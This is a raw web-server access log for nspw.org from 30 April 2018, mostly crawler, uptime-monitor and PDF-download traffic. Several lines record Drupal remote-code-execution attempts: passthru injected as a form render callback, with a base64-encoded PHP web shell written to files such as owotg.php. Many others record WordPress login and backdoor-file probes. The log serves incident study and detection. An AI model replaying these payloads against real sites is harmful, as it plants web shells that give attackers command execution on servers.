www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:09:17:43 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.236 - - [30/Apr/2018:09:18:22 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:18:40 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:18:54 -0400] "GET / HTTP/1.1" 302 529 "-" "The Knowledge AI"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:20:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 183.83.239.251 - - [30/Apr/2018:09:20:14 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 183.83.239.251 - - [30/Apr/2018:09:20:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:20:21 -0400] "GET /1999/ HTTP/1.1" 302 539 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:20:22 -0400] "GET /2000/ HTTP/1.1" 302 538 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:20:39 -0400] "GET /2001/ HTTP/1.1" 302 539 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:20:56 -0400] "GET /2002/ HTTP/1.1" 302 539 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:20:57 -0400] "GET /2003/ HTTP/1.1" 302 538 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:21:13 -0400] "GET /2004/ HTTP/1.1" 302 539 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:21:13 -0400] "GET /2005/ HTTP/1.1" 302 538 "-" "The Knowledge AI"
www.nspw.org:80 66.160.140.183 - - [30/Apr/2018:09:21:27 -0400] "GET /2006/ HTTP/1.1" 302 539 "-" "The Knowledge AI"
www.nspw.org:80 106.192.107.147 - - [30/Apr/2018:09:22:20 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:09:22:47 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:09:22:48 -0400] "GET / HTTP/1.1" 302 492 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:25:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.141 - - [30/Apr/2018:09:25:58 -0400] "GET /proceedings/1994 HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:09:26:06 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:09:26:06 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 37.187.91.117 - - [30/Apr/2018:09:27:09 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; Grobbot/2.2; +https://grob.it)"
www.nspw.org:80 115.132.159.49 - - [30/Apr/2018:09:29:11 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 115.132.159.49 - - [30/Apr/2018:09:29:14 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 70.42.131.170 - - [30/Apr/2018:09:29:52 -0400] "GET / HTTP/1.1" 302 525 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
www.nspw.org:80 ::1 - - [30/Apr/2018:09:30:01 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:09:30:02 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:30:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 212.83.179.153 - - [30/Apr/2018:09:31:13 -0400] "GET /asu.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
www.nspw.org:80 212.83.179.153 - - [30/Apr/2018:09:31:14 -0400] "GET /content-post.php HTTP/1.1" 302 556 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.35 Safari/537.36"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:09:32:39 -0400] "GET /2002/papers.shtml HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 191.55.9.246 - - [30/Apr/2018:09:34:43 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 191.55.9.246 - - [30/Apr/2018:09:34:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:35:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 103.66.226.58 - - [30/Apr/2018:09:35:50 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.66.226.58 - - [30/Apr/2018:09:35:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:09:37:51 -0400] "GET /2007/submission.shtml HTTP/1.1" 302 571 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:09:38:10 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:09:38:51 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:09:38:58 -0400] "GET /2017/accepted HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 101.199.108.55 - - [30/Apr/2018:09:39:08 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Linux; U; Android 5.0.2; zh-CN; Redmi Note 3 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 OPR/11.2.3.102637 Mobile Safari/537.36"
www.nspw.org:80 ::1 - - [30/Apr/2018:09:39:11 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:40:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [30/Apr/2018:09:42:08 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 129.78.110.124 - - [30/Apr/2018:09:44:38 -0400] "GET / HTTP/1.1" 302 488 "-" "-"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:45:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.39.254.53 - - [30/Apr/2018:09:45:20 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.39.254.53 - - [30/Apr/2018:09:45:22 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:09:47:11 -0400] "GET /2009/proceedings/1993/nspw1993-lin.pdf HTTP/1.1" 302 605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:09:49:04 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:09:49:27 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 185.231.15.22 - - [30/Apr/2018:09:49:28 -0400] "GET /papers/1997/nspw1997-moskowitz.pdf HTTP/1.1" 302 541 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:50:07 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 42.106.24.97 - - [30/Apr/2018:09:50:11 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 42.106.24.97 - - [30/Apr/2018:09:50:12 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 84.25.22.138 - - [30/Apr/2018:09:52:39 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 302 595 "http://www.kay-hamacher.de/publications.shtml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 14.215.176.19 - - [30/Apr/2018:09:52:47 -0400] "GET / HTTP/1.1" 302 525 "http://www.baidu.com/s?wd=81S" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
www.nspw.org:80 ::1 - - [30/Apr/2018:09:52:54 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:09:52:55 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [30/Apr/2018:09:52:56 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 180.76.15.16 - - [30/Apr/2018:09:53:03 -0400] "GET /papers/2003/?C=S;O=D HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:56:48 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:56:57 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Safari/538.1 Daum/4.1"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:56:59 -0400] "GET /2014/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:57:05 -0400] "GET /robots.txt HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:57:06 -0400] "GET /2015/dates HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:57:11 -0400] "GET /2014/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:09:57:16 -0400] "GET /introduction HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:09:58:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 115.99.101.247 - - [30/Apr/2018:09:58:22 -0400] "GET /papers/2008/nspw2008-julisch.pdf HTTP/1.1" 302 593 "https://www.google.co.in/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/61.0.3163.73 Mobile/15E216 Safari/602.1"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:09:59:47 -0400] "GET /2017/organizers HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 41.109.110.202 - - [30/Apr/2018:10:02:03 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.109.110.202 - - [30/Apr/2018:10:02:05 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 178.221.202.254 - - [30/Apr/2018:10:04:35 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 178.221.202.254 - - [30/Apr/2018:10:04:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:05:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 124.104.196.9 - - [30/Apr/2018:10:05:39 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 124.104.196.9 - - [30/Apr/2018:10:05:41 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 49.151.174.215 - - [30/Apr/2018:10:05:54 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 49.151.174.215 - - [30/Apr/2018:10:05:56 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:07:46 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:07:47 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 37.183.109.16 - - [30/Apr/2018:10:07:52 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.183.109.16 - - [30/Apr/2018:10:07:53 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:10:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 199.16.157.181 - - [30/Apr/2018:10:12:39 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.181 - - [30/Apr/2018:10:12:39 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 41.235.17.41 - - [30/Apr/2018:10:12:41 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.235.17.41 - - [30/Apr/2018:10:12:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:15:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 207.46.13.54 - - [30/Apr/2018:10:15:10 -0400] "GET /cfp/nspw2018-cfp.pdf HTTP/1.1" 302 569 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 163.117.204.35 - - [30/Apr/2018:10:15:40 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "https://www.google.es/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
www.nspw.org:80 34.207.239.213 - - [30/Apr/2018:10:16:10 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 535 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:10:17:09 -0400] "GET /papers/1995/?C=N;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:10:17:19 -0400] "GET /papers/1995/?C=D;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 5.12.251.180 - - [30/Apr/2018:10:18:43 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 5.12.251.180 - - [30/Apr/2018:10:18:45 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 207.241.232.47 - - [30/Apr/2018:10:19:28 -0400] "GET /robots.txt HTTP/1.0" 302 508 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)"
www.nspw.org:80 207.241.232.47 - - [30/Apr/2018:10:19:31 -0400] "GET /modules/system/system.messages.css?nhfa6e HTTP/1.0" 302 570 "http://nspw.org/" "Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:10:19:53 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20a6f9hgla3.php HTTP/1.1" 302 988 "-" "curl/7.19.7"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:10:20:06 -0400] "GET /papers/2007/?C=D;O=D HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:10:20:09 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:10:21:41 -0400] "GET /2009/proceedings/2007/?C=S;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:10:21:58 -0400] "GET /2003/hold/local.shtml HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 93.99.5.24 - - [30/Apr/2018:10:22:45 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 93.99.5.24 - - [30/Apr/2018:10:22:46 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:10:23:07 -0400] "GET /2009/proceedings/2002/?C=N;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.78 - - [30/Apr/2018:10:23:25 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:10:24:22 -0400] "GET /2015/cfp HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 52.186.11.100 - - [30/Apr/2018:10:24:23 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 52.186.11.100 - - [30/Apr/2018:10:24:23 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 302 972 "-" "curl/7.47.0"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:10:24:33 -0400] "GET /robots.txt HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 194.187.170.110 - - [30/Apr/2018:10:24:34 -0400] "GET / HTTP/1.1" 302 488 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:10:24:43 -0400] "GET /2014 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:10:24:48 -0400] "GET /2015/cfp HTTP/1.1" 302 504 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [30/Apr/2018:10:25:01 -0400] "GET /2015/program HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 201.183.151.49 - - [30/Apr/2018:10:25:05 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
